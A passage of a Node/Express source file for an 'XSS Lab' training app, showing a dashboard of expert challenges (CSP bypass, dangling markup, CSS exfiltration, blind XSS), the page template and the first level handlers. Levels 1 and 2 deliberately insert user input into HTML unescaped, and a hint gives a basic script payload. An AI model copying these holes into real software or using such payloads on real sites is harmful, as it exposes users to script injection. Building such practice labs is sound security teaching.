      <div class="card-top"><span class="card-lvl">LVL-09 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>href Injection with Filters</h2>
      <p>Your input goes into an anchor href. Filter blocks &lt;script&gt;, handlers, and "javascript:".</p>
      <div class="tags"><span class="tag">href Context</span><span class="tag">Protocol Filter</span></div>
      <a href="/level/9" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="10">
      <div class="card-top"><span class="card-lvl">LVL-10 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>CSP Bypass via JSONP</h2>
      <p>A Content-Security-Policy is in place. A same-origin JSONP endpoint is your key.</p>
      <div class="tags"><span class="tag">CSP</span><span class="tag">JSONP</span><span class="tag">Nonce</span></div>
      <a href="/level/10" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="11">
      <div class="card-top"><span class="card-lvl">LVL-11 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Double Encoding Bypass</h2>
      <p>WAF decodes once. The app decodes again. Encode your payload for the second pass.</p>
      <div class="tags"><span class="tag">Double Encoding</span><span class="tag">WAF Bypass</span></div>
      <a href="/level/11" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="12">
      <div class="card-top"><span class="card-lvl">LVL-12 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Client-Side Template Injection</h2>
      <p>All HTML tags are stripped. But a template engine evaluates {{expressions}} via eval.</p>
      <div class="tags"><span class="tag">CSTI</span><span class="tag">eval</span><span class="tag">No HTML</span></div>
      <a href="/level/12" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="13">
      <div class="card-top"><span class="card-lvl">LVL-13 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>postMessage XSS</h2>
      <p>No forms, no reflection. The page listens for cross-window messages with no origin check.</p>
      <div class="tags"><span class="tag">DOM-based</span><span class="tag">postMessage</span></div>
      <a href="/level/13" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="14">
      <div class="card-top"><span class="card-lvl">LVL-14 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>SVG Upload XSS</h2>
      <p>Upload SVG rendered inline. Script tags are stripped — SVGs have their own tricks.</p>
      <div class="tags"><span class="tag">Stored</span><span class="tag">SVG</span><span class="tag">File Upload</span></div>
      <a href="/level/14" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="15">
      <div class="card-top"><span class="card-lvl">LVL-15 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Mutation XSS</h2>
      <p>A client-side sanitizer strips scripts. But the browser's parser mutates HTML in &lt;template&gt;.</p>
      <div class="tags"><span class="tag">mXSS</span><span class="tag">DOMParser</span><span class="tag">Sanitizer Bypass</span></div>
      <a href="/level/15" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="16">
      <div class="card-top"><span class="card-lvl">LVL-16 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Recursive Keyword Filter</h2>
      <p>The filter loops until nothing changes. Think about alternative execution contexts.</p>
      <div class="tags"><span class="tag">Recursive Filter</span><span class="tag">srcdoc</span><span class="tag">Context Escape</span></div>
      <a href="/level/16" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="17">
      <div class="card-top"><span class="card-lvl">LVL-17 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>The Polyglot</h2>
      <p>Your input appears in three contexts: HTML, attribute, and JS string. Find the weakest link.</p>
      <div class="tags"><span class="tag">Multi-Context</span><span class="tag">Polyglot</span></div>
      <a href="/level/17" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="18">
      <div class="card-top"><span class="card-lvl">LVL-18 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>DOM Clobbering</h2>
      <p>No scripts or handlers. The page reads global variables that HTML elements can overwrite.</p>
      <div class="tags"><span class="tag">DOM Clobbering</span><span class="tag">Named Access</span></div>
      <a href="/level/18" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="19">
      <div class="card-top"><span class="card-lvl">LVL-19 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Prototype Pollution → XSS</h2>
      <p>No HTML injection. Pollute the prototype chain via a naive deep-merge to achieve XSS.</p>
      <div class="tags"><span class="tag">Prototype Pollution</span><span class="tag">JSON</span></div>
      <a href="/level/19" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="20">
      <div class="card-top"><span class="card-lvl">LVL-20 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Base Tag Injection</h2>
      <p>CSP nonce is in place. Inject before the scripts to redirect relative resource loads.</p>
      <div class="tags"><span class="tag">Base Tag</span><span class="tag">CSP Bypass</span></div>
      <a href="/level/20" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="21">
      <div class="card-top"><span class="card-lvl">LVL-21 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Dangling Markup Injection</h2>
      <p>All JS blocked. Exfiltrate a CSRF token from the page using only HTML injection.</p>
      <div class="tags"><span class="tag">Dangling Markup</span><span class="tag">Data Exfil</span><span class="tag">No JS</span></div>
      <a href="/level/21" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="22">
      <div class="card-top"><span class="card-lvl">LVL-22 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>JSON Injection in Script Block</h2>
      <p>Your input is inside a JSON value in a nonced script block. Angle brackets escaped — are quotes?</p>
      <div class="tags"><span class="tag">JSON Injection</span><span class="tag">Script Context</span><span class="tag">CSP Bypass</span></div>
      <a href="/level/22" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="23">
      <div class="card-top"><span class="card-lvl">LVL-23 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>URL Scheme Bypass</h2>
      <p>Your URL goes into a href. Scripts, handlers, and javascript: are blocked. HTML entity decode...</p>
      <div class="tags"><span class="tag">Entity Encoding</span><span class="tag">href Context</span></div>
      <a href="/level/23" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="24">
      <div class="card-top"><span class="card-lvl">LVL-24 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>CSS Injection Exfiltration</h2>
      <p>No JavaScript vectors. Inject CSS to exfiltrate a hidden token using attribute selectors and url().</p>
      <div class="tags"><span class="tag">CSS Injection</span><span class="tag">Data Exfil</span><span class="tag">No JS</span></div>
      <a href="/level/24" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="26">
      <div class="card-top"><span class="card-lvl">LVL-26 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>CRLF → Response Splitting</h2>
      <p>Your input is echoed into a response header. Inject newlines to split the response and add HTML.</p>
      <div class="tags"><span class="tag">CRLF Injection</span><span class="tag">Response Splitting</span><span class="tag">Headers</span></div>
      <a href="/level/26" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="29">
      <div class="card-top"><span class="card-lvl">LVL-29 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>iframe Sandbox Escape</h2>
      <p>User content is sandboxed in an iframe. The sandbox flags are dangerously combined.</p>
      <div class="tags"><span class="tag">Sandbox Escape</span><span class="tag">iframe</span><span class="tag">Same-Origin</span></div>
      <a href="/level/29" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="30">
      <div class="card-top"><span class="card-lvl">LVL-30 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>AngularJS Sandbox Escape</h2>
      <p>The page uses AngularJS 1.x. Escape the expression sandbox via constructor chain tricks.</p>
      <div class="tags"><span class="tag">AngularJS</span><span class="tag">CSTI</span><span class="tag">Sandbox Escape</span></div>
      <a href="/level/30" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="31">
      <div class="card-top"><span class="card-lvl">LVL-31 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Web Component Slot Injection</h2>
      <p>A custom element builds its shadow DOM with user input. Script tags are stripped — slots aren't.</p>
      <div class="tags"><span class="tag">Web Components</span><span class="tag">Shadow DOM</span><span class="tag">Slot Injection</span></div>
      <a href="/level/31" class="card-link">Start Challenge</a>
    </div>
    <div class="card diff-expert" data-level="33">
      <div class="card-top"><span class="card-lvl">LVL-33 &mdash; Expert</span><span class="solved-check">✓</span></div>
      <h2>Blind XSS (Out-of-Band)</h2>
      <p>Your payload is reviewed by an admin panel you can't see. Fire a callback when it executes.</p>
      <div class="tags"><span class="tag">Blind XSS</span><span class="tag">Out-of-Band</span><span class="tag">Admin Panel</span></div>
      <a href="/level/33" class="card-link">Start Challenge</a>
    </div>
  </div>

  <script>
    function toggleHowto(){
      var btn=document.getElementById('howtoBtn');
      var body=document.getElementById('howtoBody');
      var open=body.classList.contains('visible');
      body.classList.toggle('visible',!open);
      btn.classList.toggle('open',!open);
    }
    fetch('/api/solutions').then(function(r){return r.json();}).then(function(data){
      var solved=Object.keys(data);
      solved.forEach(function(lvl){
        var card=document.querySelector('[data-level="'+lvl+'"]');
        if(card){
          card.classList.add('solved');
          card.querySelector('.card-link').textContent='Completed ✓';
        }
      });
      var count=solved.length;
      document.getElementById('solved-count').textContent=count;
      document.getElementById('remaining-count').textContent=33-count;
      document.getElementById('progress-label').textContent=count+' / 33';
      document.getElementById('progress-fill').style.width=((count/33)*100)+'%';
    });
  </script>
</body>
</html>`);
});

// ============================================================
// SHARED HELPER: levelPage  (redesigned UI)
// ============================================================
function levelPage (title, levelNum, difficulty, defenses, hint, bodyContent, extraHead) {
  const hintEncoded = Buffer.from(hint).toString('base64');
  const diffKey = difficulty;
  const TOTAL = 33;

  const diffMeta = {
    Easy: { label: 'EASY', color: '#00ff9d', glow: 'rgba(0,255,157,0.25)', bg: 'rgba(0,255,157,0.06)', border: 'rgba(0,255,157,0.3)' },
    Medium: { label: 'MEDIUM', color: '#ffd60a', glow: 'rgba(255,214,10,0.25)', bg: 'rgba(255,214,10,0.06)', border: 'rgba(255,214,10,0.3)' },
    Hard: { label: 'HARD', color: '#ff6b35', glow: 'rgba(255,107,53,0.25)', bg: 'rgba(255,107,53,0.06)', border: 'rgba(255,107,53,0.3)' },
    Expert: { label: 'EXPERT', color: '#e040fb', glow: 'rgba(224,64,251,0.25)', bg: 'rgba(224,64,251,0.06)', border: 'rgba(224,64,251,0.3)' },
  };
  const diff = diffMeta[diffKey] || diffMeta.Expert;

  // Progress breadcrumb dots
  const dots = Array.from({ length: TOTAL }, (_, i) => {
    const n = i + 1;
    const isCurrent = n === levelNum;
    const style = isCurrent
      ? `background:${diff.color};box-shadow:0 0 6px ${diff.color};transform:scale(1.5);`
      : 'background:#2a2a3a;';
    return `<span class="dot" style="${style}" title="Level ${n}"></span>`;
  }).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Level ${levelNum} — ${title} · XSS Lab</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@600;700;800&display=swap" rel="stylesheet">
  ${extraHead || ''}
  <style>
    :root {
      --bg:       #07070f;
      --surface:  #0e0e1a;
      --surface2: #13131f;
      --border:   #1e1e30;
      --border2:  #2a2a3e;
      --text:     #d4d4e8;
      --muted:    #5a5a7a;
      --accent:   ${diff.color};
      --glow:     ${diff.glow};
      --acc-bg:   ${diff.bg};
      --acc-border: ${diff.border};
      --mono: 'JetBrains Mono', monospace;
      --sans: 'Syne', sans-serif;
    }
    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

    body {
      font-family: var(--mono);
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      display: grid;
      grid-template-rows: auto auto 1fr auto;
      grid-template-columns: 1fr;
      overflow-x: hidden;
    }

    /* ── Scanline overlay ── */
    body::before {
      content:'';
      position:fixed; inset:0; pointer-events:none; z-index:0;
      background: repeating-linear-gradient(
        0deg,
        transparent,
        transparent 2px,
        rgba(0,0,0,0.08) 2px,
        rgba(0,0,0,0.08) 4px
      );
    }

    /* ── Top nav bar ── */
    .topbar {
      position: sticky; top: 0; z-index: 100;
      background: rgba(7,7,15,0.92);
      backdrop-filter: blur(12px);
      border-bottom: 1px solid var(--border);
      padding: 0.75rem 2rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
    }
    .topbar-left { display:flex; align-items:center; gap:1.25rem; }
    .topbar-logo {
      font-family: var(--sans);
      font-weight: 800;
      font-size: 0.9rem;
      color: var(--accent);
      text-shadow: 0 0 12px var(--accent);
      letter-spacing: 0.02em;
      text-decoration: none;
    }
    .topbar-sep { color: var(--border2); }
    .topbar a.nav-link {
      color: var(--muted);
      text-decoration: none;
      font-size: 0.72rem;
      font-weight: 500;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      transition: color 0.2s;
    }
    .topbar a.nav-link:hover { color: var(--text); }
    .topbar-right { display:flex; align-items:center; gap:0.75rem; }
    .level-counter {
      font-size: 0.72rem;
      color: var(--muted);
      letter-spacing: 0.05em;
    }
    .level-counter span { color: var(--accent); font-weight: 700; }

    /* ── Progress dots row ── */
    .progress-strip {
      background: var(--surface);
      border-bottom: 1px solid var(--border);
      padding: 0.6rem 2rem;
      display: flex;
      align-items: center;
      gap: 0.75rem;
      overflow-x: auto;
    }
    .progress-strip::-webkit-scrollbar { height: 3px; }
    .progress-strip::-webkit-scrollbar-thumb { background: var(--border2); }
    .dots-label {
      font-size: 0.65rem;
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.1em;
      white-space: nowrap;
      flex-shrink: 0;
    }
    .dots-row {
      display: flex;
      gap: 4px;
      align-items: center;
      flex-wrap: nowrap;
    }
    .dot {
      width: 7px; height: 7px;
      border-radius: 50%;
      display: inline-block;
      transition: transform 0.2s;
      flex-shrink: 0;
    }

    /* ── Main layout ── */
    .main {
      display: grid;
      grid-template-columns: 1fr 340px;
      gap: 0;
      min-height: calc(100vh - 100px);
      position: relative;
      z-index: 1;
    }

    /* ── Left panel: challenge ── */
    .challenge-panel {
      padding: 2.5rem 2rem;
      border-right: 1px solid var(--border);
      display: flex;
      flex-direction: column;
      gap: 2rem;
    }

    /* ── Level header ── */
    .level-heading {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
      padding-bottom: 1.5rem;
      border-bottom: 1px solid var(--border);
    }
    .heading-row {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      flex-wrap: wrap;
    }
    .level-num-tag {
      font-family: var(--mono);
      font-size: 0.68rem;
      font-weight: 700;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--muted);
      background: var(--surface2);
      border: 1px solid var(--border2);
      padding: 0.2rem 0.6rem;
      border-radius: 4px;
    }
    .diff-badge {
      font-family: var(--mono);
      font-size: 0.68rem;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      color: var(--accent);
      background: var(--acc-bg);
      border: 1px solid var(--acc-border);
      padding: 0.2rem 0.7rem;
      border-radius: 4px;
      text-shadow: 0 0 8px var(--glow);
    }
    .level-title {
      font-family: var(--sans);
      font-size: 1.85rem;
      font-weight: 800;
      color: #eeeeff;
      line-height: 1.15;
      letter-spacing: -0.01em;
    }
    .defenses-row {
      display: flex;
      align-items: flex-start;
      gap: 0.5rem;
      font-size: 0.78rem;
    }
    .defenses-label {
      color: var(--muted);
      text-transform: uppercase;
      letter-spacing: 0.08em;
      font-size: 0.68rem;
      margin-top: 0.1rem;
      white-space: nowrap;
    }
    .defenses-value {
      color: var(--text);
      line-height: 1.5;
    }

    /* ── Terminal challenge box ── */
    .terminal-box {
      background: var(--surface);
      border: 1px solid var(--border2);
      border-radius: 10px;
      overflow: hidden;
      box-shadow: 0 4px 32px rgba(0,0,0,0.4);
    }
    .terminal-titlebar {
      background: var(--surface2);
      border-bottom: 1px solid var(--border);
      padding: 0.5rem 1rem;
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .tb-dot { width:10px; height:10px; border-radius:50%; }
    .tb-dot.red   { background:#ff5f57; }
    .tb-dot.yellow{ background:#febc2e; }
    .tb-dot.green { background:#28c840; }
    .tb-title {
      margin-left: 0.5rem;
      font-size: 0.72rem;
      color: var(--muted);
      letter-spacing: 0.06em;
    }
    .terminal-body {
      padding: 1.5rem;
    }

    /* ── Forms inside challenge area ── */
    form {
      display: flex;
      gap: 0.6rem;
      flex-wrap: wrap;
      margin-bottom: 0.75rem;
    }
    input[type="text"], textarea, input[type="file"], select {
      flex: 1;
      min-width: 200px;
      padding: 0.65rem 1rem;
      background: #0a0a14;
      border: 1px solid var(--border2);
      border-radius: 6px;
      color: var(--text);
      font-size: 0.875rem;
      font-family: var(--mono);
      transition: border-color 0.2s, box-shadow 0.2s;
    }
    input[type="text"]:focus, textarea:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 0 2px var(--glow);
    }
    button, input[type="submit"] {
      padding: 0.65rem 1.4rem;
      background: var(--acc-bg);
      border: 1px solid var(--acc-border);
      border-radius: 6px;
      color: var(--accent);
      font-size: 0.8rem;
      font-weight: 700;
      font-family: var(--mono);
      letter-spacing: 0.06em;
      text-transform: uppercase;
      cursor: pointer;
      transition: background 0.2s, box-shadow 0.2s;
    }
    button:hover, input[type="submit"]:hover {
      background: rgba(255,255,255,0.06);
      box-shadow: 0 0 10px var(--glow);
    }
    button[style*="da3633"], button[style*="f85149"] {
      background: rgba(255,80,80,0.08);
      border-color: rgba(255,80,80,0.3);
      color: #ff5555;
    }
    .output, #output, #renderOutput {
      padding: 1rem;
      background: #0a0a14;
      border: 1px solid var(--border);
      border-radius: 6px;
      min-height: 3rem;
      word-break: break-all;
      font-size: 0.85rem;
      line-height: 1.6;
    }

    /* ── Right sidebar ── */
    .sidebar {
      padding: 2rem 1.5rem;
      display: flex;
      flex-direction: column;
      gap: 1.25rem;
      background: var(--surface);
    }

    .sidebar-section {
      border: 1px solid var(--border);
      border-radius: 8px;
      overflow: hidden;
    }
    .sidebar-section-header {
      background: var(--surface2);
      border-bottom: 1px solid var(--border);
      padding: 0.55rem 1rem;
      font-size: 0.65rem;
      font-weight: 700;
      text-transform: uppercase;
      letter-spacing: 0.14em;
      color: var(--muted);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .sidebar-section-header .dot-accent {
      width: 6px; height: 6px;
      border-radius: 50%;
      background: var(--accent);
      box-shadow: 0 0 6px var(--accent);
    }
    .sidebar-section-body {
      padding: 1rem;
    }

    /* ── Hint section ── */
    .hint-toggle {
      width: 100%;
      background: none;
      border: none;
      border-radius: 0;
      color: var(--muted);
      font-size: 0.72rem;
      letter-spacing: 0.08em;
      text-transform: uppercase;
      padding: 0.7rem 1rem;
      text-align: left;
      display: flex;
      align-items: center;
      justify-content: space-between;
      cursor: pointer;
      transition: color 0.2s, background 0.2s;
      font-family: var(--mono);
    }
    .hint-toggle:hover { color: var(--text); background: rgba(255,255,255,0.03); box-shadow: none; }
    .hint-toggle .arrow { transition: transform 0.25s; font-size: 0.8rem; }
    .hint-toggle.open .arrow { transform: rotate(180deg); }
    .hint-body {
      display: none;
      padding: 0 1rem 1rem;
      font-size: 0.8rem;
      color: #9090b0;
      line-height: 1.7;
      border-top: 1px solid var(--border);
      padding-top: 0.75rem;
    }
    .hint-body.visible { display: block; }
    .hint-body code {
      background: #12121e;
      padding: 0.1rem 0.35rem;
      border-radius: 3px;
      font-size: 0.78rem;
      color: var(--accent);
    }

    /* ── Writeup section ── */
    #writeupSection {
      display: none;
      flex-direction: column;
      gap: 1rem;
      margin-top: 0.5rem;
    }
    #writeupSection.visible { display: flex; }
    .writeup-card {
      background: var(--surface);
      border: 1px solid var(--border2);
      border-radius: 10px;
      overflow: hidden;
      border-left: 3px solid var(--accent);
      box-shadow: inset 0 0 30px rgba(0,0,0,0.2);
    }
    .writeup-card-header {
      background: var(--surface2);
      padding: 0.65rem 1.25rem;
      font-size: 0.65rem;
      font-weight: 700;
      letter-spacing: 0.14em;
      text-transform: uppercase;
      color: var(--accent);
      border-bottom: 1px solid var(--border);
      display: flex;
      align-items: center;
      gap: 0.5rem;
    }
    .writeup-card-body {
      padding: 1rem 1.25rem;
      font-size: 0.82rem;
      color: #b0b0cc;
      line-height: 1.75;
    }
    .writeup-card-body code {
      background: #0d0d1a;
      color: var(--accent);
      padding: 0.1rem 0.35rem;
      border-radius: 3px;
      font-size: 0.78rem;
    }
    .writeup-title {
      font-family: var(--sans);
      font-size: 1.1rem;
      font-weight: 700;
      color: #eeeeff;
      padding: 1rem 1.25rem 0.25rem;
    }

    /* ── Success banner ── */
    .success-banner {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0;
      z-index: 9999;
      background: linear-gradient(90deg, #003d1a 0%, #001a2e 50%, #003d1a 100%);
      border-bottom: 2px solid var(--accent);
      box-shadow: 0 4px 30px var(--glow);
      padding: 0.9rem 2rem;
      align-items: center;
      justify-content: center;
      gap: 2rem;
      animation: bannerIn 0.4s cubic-bezier(0.16,1,0.3,1);
      font-family: var(--mono);
    }
    .success-banner-text {
      font-size: 0.9rem;
      font-weight: 700;
      color: var(--accent);
      letter-spacing: 0.04em;
      text-shadow: 0 0 12px var(--glow);
    }
    .success-banner-text::before {
      content: '✓ ';
    }
    .success-banner a {
      font-size: 0.75rem;
      font-weight: 700;
      letter-spacing: 0.1em;
      text-transform: uppercase;
      color: var(--text);
      text-decoration: none;
      border: 1px solid var(--border2);
      padding: 0.35rem 1rem;
      border-radius: 5px;
      background: rgba(255,255,255,0.05);
      transition: background 0.2s, border-color 0.2s;
    }
    .success-banner a:hover { background: rgba(255,255,255,0.1); border-color: var(--accent); }
    @keyframes bannerIn {
      from { transform: translateY(-110%); opacity: 0; }
      to   { transform: translateY(0);    opacity: 1; }
    }

    /* Scrollbar */
    ::-webkit-scrollbar { width: 5px; height: 5px; }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }

    /* Responsive */
    @media (max-width: 900px) {
      .main { grid-template-columns: 1fr; }
      .challenge-panel { border-right: none; border-bottom: 1px solid var(--border); }
      .sidebar { border-top: 1px solid var(--border); }
    }
  </style>
</head>
<body>

  <!-- Success banner -->
  <div class="success-banner" id="successBanner">
    <span class="success-banner-text">XSS Triggered! Level ${levelNum} Complete!</span>
    <a href="/">Dashboard</a>
    ${levelNum < TOTAL ? `<a href="/level/${levelNum + 1}">Next Level →</a>` : '<a href="/">All Done!</a>'}
  </div>

  <!-- Solve detection script -->
  <script>
    (function(){
      var solved=false;
      var levelNum=${levelNum};
      function onSolve(){
        if(solved)return;
        solved=true;
        var banner=document.getElementById('successBanner');
        banner.style.display='flex';
        var payload=new URLSearchParams(location.search).get('q')
          ||new URLSearchParams(location.search).get('url')
          ||new URLSearchParams(location.search).get('name')
          ||new URLSearchParams(location.search).get('css')
          ||new URLSearchParams(location.search).get('next')
          ||location.hash.substring(1)
          ||'(console/postMessage payload)';
        fetch('/api/solve',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({level:levelNum,payload:payload,url:location.href})
        }).then(function(r){return r.json();}).then(function(data){
          if(data.writeup){
            showWriteup(data.writeup);
          }
        }).catch(function(){});
      }
      window._onSolve = onSolve;
      var _alert=window.alert;
      window.alert=function(){onSolve();_alert.apply(window,arguments);};
      var _confirm=window.confirm;
      window.confirm=function(){onSolve();return _confirm.apply(window,arguments);};
      var _prompt=window.prompt;
      window.prompt=function(){onSolve();return _prompt.apply(window,arguments);};
    })();

    function showWriteup(w) {
      var sec = document.getElementById('writeupSection');
      if(!sec) return;
      sec.classList.add('visible');
      document.getElementById('writeupTitle').textContent = w.title;
      document.getElementById('writeupWhy').innerHTML = w.why;
      document.getElementById('writeupLesson').innerHTML = w.lesson;
      document.getElementById('writeupReal').innerHTML = w.realWorld;
      sec.scrollIntoView({behavior:'smooth', block:'start'});
    }
  </script>

  <!-- Top navigation bar -->
  <nav class="topbar">
    <div class="topbar-left">
      <a href="/" class="topbar-logo">XSS Lab</a>
      <span class="topbar-sep">|</span>
      <a href="/" class="nav-link">← Dashboard</a>
      <a href="/cheatsheet" class="nav-link">Cheat Sheet</a>
    </div>
    <div class="topbar-right">
      <span class="level-counter">Level <span>${levelNum}</span> / ${TOTAL}</span>
    </div>
  </nav>

  <!-- Progress strip -->
  <div class="progress-strip">
    <span class="dots-label">Progress</span>
    <div class="dots-row">${dots}</div>
  </div>

  <!-- Main two-column layout -->
  <div class="main">

    <!-- Left: challenge -->
    <div class="challenge-panel">

      <!-- Level heading -->
      <div class="level-heading">
        <div class="heading-row">
          <span class="level-num-tag">LVL-${String(levelNum).padStart(2, '0')}</span>
          <span class="diff-badge">${diff.label}</span>
        </div>
        <h1 class="level-title">${title}</h1>
        <div class="defenses-row">
          <span class="defenses-label">Defenses:</span>
          <span class="defenses-value">${defenses}</span>
        </div>
      </div>

      <!-- Challenge terminal box -->
      <div class="terminal-box">
        <div class="terminal-titlebar">
          <span class="tb-dot red"></span>
          <span class="tb-dot yellow"></span>
          <span class="tb-dot green"></span>
          <span class="tb-title">challenge-environment — level-${levelNum}</span>
        </div>
        <div class="terminal-body">
          ${bodyContent}
        </div>
      </div>

      <!-- Writeup (shown after solve) -->
      <div id="writeupSection">
        <div class="writeup-card">
          <div class="writeup-title" id="writeupTitle"></div>
          <div class="writeup-card-header"><span class="dot-accent"></span>Why It Worked</div>
          <div class="writeup-card-body" id="writeupWhy"></div>
        </div>
        <div class="writeup-card">
          <div class="writeup-card-header"><span class="dot-accent"></span>Key Lesson</div>
          <div class="writeup-card-body" id="writeupLesson"></div>
        </div>
        <div class="writeup-card">
          <div class="writeup-card-header"><span class="dot-accent"></span>Real-World Application</div>
          <div class="writeup-card-body" id="writeupReal"></div>
        </div>
      </div>

    </div><!-- /challenge-panel -->

    <!-- Right: sidebar -->
    <div class="sidebar">

      <!-- Objective -->
      <div class="sidebar-section">
        <div class="sidebar-section-header">
          <span class="dot-accent"></span> Objective
        </div>
        <div class="sidebar-section-body" style="font-size:0.8rem;color:#9090b0;line-height:1.65;">
          Execute <code style="background:#0d0d1a;color:var(--accent);padding:0.1rem 0.35rem;border-radius:3px;">alert('XSS')</code> (or trigger the level's success condition) in your browser.
        </div>
      </div>

      <!-- Hint -->
      <div class="sidebar-section">
        <button class="hint-toggle" id="hintToggle" onclick="toggleHint()">
          <span>Hint</span>
          <span class="arrow">▾</span>
        </button>
        <div class="hint-body" id="hintContent"></div>
      </div>

      <!-- Navigation -->
      <div class="sidebar-section">
        <div class="sidebar-section-header">
          <span class="dot-accent"></span> Navigation
        </div>
        <div class="sidebar-section-body" style="display:flex;flex-direction:column;gap:0.5rem;">
          ${levelNum > 1 ? `<a href="/level/${levelNum - 1}" style="font-size:0.75rem;color:var(--muted);text-decoration:none;display:flex;align-items:center;gap:0.4rem;transition:color 0.2s;" onmouseover="this.style.color='var(--text)'" onmouseout="this.style.color='var(--muted)'">← Level ${levelNum - 1}</a>` : ''}
          ${levelNum < TOTAL ? `<a href="/level/${levelNum + 1}" style="font-size:0.75rem;color:var(--accent);text-decoration:none;display:flex;align-items:center;gap:0.4rem;font-weight:700;" >Level ${levelNum + 1} →</a>` : '<span style="font-size:0.75rem;color:var(--muted);">Final level!</span>'}
          <a href="/" style="font-size:0.72rem;color:var(--muted);text-decoration:none;margin-top:0.25rem;transition:color 0.2s;" onmouseover="this.style.color='var(--text)'" onmouseout="this.style.color='var(--muted)'">↩ All Levels</a>
        </div>
      </div>

    </div><!-- /sidebar -->
  </div><!-- /main -->

  <script>
    // Hint toggle
    function toggleHint() {
      var btn = document.getElementById('hintToggle');
      var body = document.getElementById('hintContent');
      var isOpen = body.classList.contains('visible');
      if (!isOpen) {
        if (!body.dataset.loaded) {
          body.dataset.loaded = '1';
          body.innerHTML = atob('${hintEncoded}');
        }
        body.classList.add('visible');
        btn.classList.add('open');
      } else {
        body.classList.remove('visible');
        btn.classList.remove('open');
      }
    }

    // Mark solved dots from server solutions
    fetch('/api/solutions').then(function(r){return r.json();}).then(function(data){
      Object.keys(data).forEach(function(lvl){
        var dots = document.querySelectorAll('.dot');
        var idx = parseInt(lvl) - 1;
        if(dots[idx] && parseInt(lvl) !== ${levelNum}) {
          dots[idx].style.background = '#1e4d2e';
          dots[idx].style.border = '1px solid #2ea043';
        }
      });
    }).catch(function(){});
  </script>

  ${solutions[levelNum] && writeups[levelNum] ? `<script>
    (function(){
      document.getElementById('successBanner').style.display='flex';
      showWriteup(${JSON.stringify(writeups[levelNum])});
    })();
  </script>` : ''}

</body>
</html>`;
}

// ============================================================
// LEVELS 1–23 (original — unchanged)
// ============================================================

// LEVEL 1
app.get('/level/1', (req, res) => {
  const q = req.query.q || '';
  const output = q ? `<div class="output"><p>Search results for: ${q}</p></div>` : '';
  res.send(levelPage('Hello, Reflected XSS', 1, 'Easy',
    'None &mdash; your input is reflected directly into HTML with zero filtering.',
    'Try injecting an HTML tag that executes JavaScript. The simplest payload: <code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code>',
    `<p style="color:#8b949e;margin-bottom:1rem;">Enter a search term. Your input appears in the page below.</p>
    <form method="GET"><input type="text" name="q" placeholder="Search..."><button type="submit">Search</button></form>
    ${output}`));
});

// LEVEL 2
app.get('/level/2', (req, res) => {
  const entries = guestbook.map(e =>
    `<div style="padding:0.75rem;border-bottom:1px solid #21262d;"><strong style="color:#58a6ff;">${e.name}</strong><p style="margin-top:0.25rem;">${e.message}</p></div>`
  ).join('');
